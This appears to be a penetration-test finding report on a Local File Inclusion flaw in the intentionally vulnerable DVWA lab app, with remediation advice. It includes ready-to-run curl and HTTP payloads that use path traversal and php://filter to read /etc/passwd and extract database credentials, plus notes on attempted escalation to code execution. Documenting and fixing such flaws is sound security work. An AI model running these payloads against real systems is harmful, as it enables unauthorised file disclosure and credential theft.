# Local File Inclusion (LFI) in DVWA File Inclusion module (parameter "page")

**ID:** vuln-0004
**Severity:** HIGH
**Found:** 2025-10-22 16:41:41 UTC

## Description

Executive Summary
A Local File Inclusion (LFI) vulnerability exists in DVWA’s File Inclusion module at /DVWA/vulnerabilities/fi/. The GET parameter page is passed to PHP include() without proper validation, allowing authenticated users to read arbitrary files on the server and disclose sensitive information, including application configuration and PHP source code via php://filter. This results in high confidentiality impact and enables further attack chaining (e.g., credential compromise, source analysis for additional exploits).

Scope and Context
- Affected endpoint:
  GET http://192.168.13.214/DVWA/vulnerabilities/fi/?page=VALUE
- Vulnerable parameter: page (user-controlled include path)
- Authentication context: DVWA authenticated session (security=low)
- Environment (observed): Apache/2.4.58 (Ubuntu), PHP 8.3.6
- Baseline proxy evidence: request ID 3756 for /vulnerabilities/fi/ with page traversal
- Reproduction steps:
  1) Browse to DVWA login: /DVWA/login.php
  2) Authenticate with default credentials: admin / password
  3) Navigate to DVWA Security and set level to Low (if not already)
  4) Navigate to File Inclusion module: /DVWA/vulnerabilities/fi/
  5) Send a GET request with traversal payload in page

Verified Exploitation Evidence
1) Arbitrary file read – /etc/passwd
   - Payload: page=../../../../../../etc/passwd
   - Evidence file: /workspace/findings/dvwa_lfi_etc_passwd_fixed.html
   - Marker observed: “root:x:0:0:”
   - Example PoC:
     curl -s "http://192.168.13.214/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" -H "Cookie: PHPSESSID=<valid>; security=low"

2) Additional sensitive files readable
   - /etc/hosts
     Evidence: /workspace/findings/dvwa_lfi_etc_hosts.html
     Snippet markers: “127.0.0.1 localhost”
   - /proc/self/cmdline
     Evidence: /workspace/findings/dvwa_lfi_proc_cmdline.html
     Snippet markers: “/usr/sbin/apache2 -k start”
   - /etc/apache2/sites-enabled/000-default.conf
     Evidence: /workspace/findings/dvwa_lfi_apache_default.html
     Snippet markers: “DocumentRoot /var/...”, virtual host configuration details

3) PHP source disclosure via php://filter
   - Config file: php://filter/convert.base64-encode/resource=/var/www/html/DVWA/config/config.inc.php
     Raw evidence: /workspace/findings/dvwa_lfi_dvwa_config_phpfilter.html
     Decoded source: /workspace/findings/dvwa_lfi_dvwa_config_phpfilter.decoded.txt
     Extracted DB credentials: /workspace/findings/dvwa_lfi_extracted_secrets.json
       Example extracted:
       {
         "db_user": "dvwa",
         "db_password": "p@ssw0rd",
         "db_database": "dvwa",
         "db_server": "127.0.0.1"
       }
   - Module source (for triage and remediation insight):
     php://filter/convert.base64-encode/resource=/var/www/html/DVWA/vulnerabilities/fi/index.php
     Decoded: /workspace/findings/dvwa_lfi_fi_index_phpfilter.decoded.txt
     php://filter/convert.base64-encode/resource=/var/www/html/DVWA/vulnerabilities/fi/include.php
     Decoded: /workspace/findings/dvwa_lfi_fi_include_phpfilter.decoded.txt

4) Attempts that failed (for completeness and constraints)
   - /proc/self/environ include with PHP-in-User-Agent marker to explore RCE via environment injection:
     Artifact: /workspace/findings/dvwa_lfi_rce_environ.html
     Result: No execution marker observed (hit=false)
   - /var/log/apache2/access.log include (log poisoning exploration):
     Artifact: /workspace/findings/dvwa_lfi_accesslog.html
     Result: Permission denied; file not readable by web process

Master Summary Artifact
- Aggregated results, payload matrix, statuses, artifacts, and summary flags:
  /workspace/findings/dvwa_lfi_validation.json

Representative HTTP Requests (redacted)
- Example authenticated request structure (GET):
  GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1
  Host: 192.168.13.214
  Cookie: PHPSESSID=<valid>; security=low
  Connection: close

- Example php://filter request (GET):
  GET /DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/DVWA/config/config.inc.php HTTP/1.1
  Host: 192.168.13.214
  Cookie: PHPSESSID=<valid>; security=low
  Connection: close
  Note: Base64-decode the body to retrieve the PHP source and credentials

Business Impact
- Confidentiality: High
  Attackers can read arbitrary files in the server context, including:
  - OS files (/etc/passwd, /etc/hosts)
  - Application configuration (config.inc.php containing DB credentials)
  - Application source code (via php://filter)
  This enables credential theft, environment mapping, and facilitates further attacks such as direct database access and deeper exploitation of other modules.
- Integrity: Not directly impacted in our tests (read-only), but information disclosure significantly increases the likelihood of subsequent integrity-impacting attacks.
- Availability: Not directly impacted by the LFI itself.
- Potential chaining:
  - Use leaked DB credentials to access or pivot into the database (data exfiltration, account takeover)
  - Analyze source to identify additional vulnerabilities (e.g., injection points, weak auth logic)
  - Under different server configurations, LFI may be escalated to RCE (e.g., via log/session poisoning) though not achievable in this environment due to permissions/behavior

CVSS v3.1 (estimated)
- Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- Score (approx): 6.5 (High)
- Rationale: Authenticated (low privileges) required; high confidentiality impact; no direct integrity/availability impact observed.

Root Cause and Technical Details
- User-controlled page parameter is passed to include() without:
  - Strict allowlist of permitted files
  - Proper path normalization and traversal checks
  - Blocking of stream wrappers (php://filter)
- This permits directory traversal (../) to escape the intended include directory and read arbitrary files; php://filter enables disclosure of PHP source without execution.

Proof-of-Concept (ready to run)
- etc/passwd read:
  curl -s "http://192.168.13.214/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd" -H "Cookie: PHPSESSID=<valid>; security=low"
- Config source disclosure:
  curl -s "http://192.168.13.214/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/var/www/html/DVWA/config/config.inc.php" -H "Cookie: PHPSESSID=<valid>; security=low" | base64 -d

Evidence Files (server-side artifacts)
- /workspace/findings/dvwa_lfi_validation.json
- /workspace/findings/dvwa_lfi_etc_passwd_fixed.html
- /workspace/findings/dvwa_lfi_etc_hosts.html
- /workspace/findings/dvwa_lfi_proc_cmdline.html
- /workspace/findings/dvwa_lfi_apache_default.html
- /workspace/findings/dvwa_lfi_dvwa_config_phpfilter.html
- /workspace/findings/dvwa_lfi_dvwa_config_phpfilter.decoded.txt
- /workspace/findings/dvwa_lfi_fi_index_phpfilter.decoded.txt
- /workspace/findings/dvwa_lfi_fi_include_phpfilter.decoded.txt
- /workspace/findings/dvwa_lfi_extracted_secrets.json
- /workspace/findings/dvwa_lfi_rce_environ.html (no execution)
- /workspace/findings/dvwa_lfi_accesslog.html (permission denied)

Remediation Guidance
- Do not pass user input directly to include()/require().
- Implement a strict allowlist mapping from user-friendly identifiers to specific files (e.g., switch/case with fixed paths).
- Normalize requested paths (realpath) and ensure the resolved path remains within an allowed directory; reject any traversal attempts.
- Disable URL and wrapper features not required by the app:
  - php.ini: allow_url_fopen=0, allow_url_include=0
- Restrict PHP’s file system access with open_basedir to only necessary directories.
- Reduce web server process privileges and tighten permissions on sensitive files (logs, configs).
- Reduce error verbosity in production to avoid revealing file paths and stack traces.
- Consider WAF rules against traversal patterns (../) and wrapper schemes (php://).

Conclusion
The File Inclusion module allows arbitrary file reads and PHP source disclosure, exposing credentials and sensitive configuration. The vulnerability is high severity due to the breadth of accessible data and the potential for attack chaining. Remediation should prioritize strict server-side validation and configuration hardening.
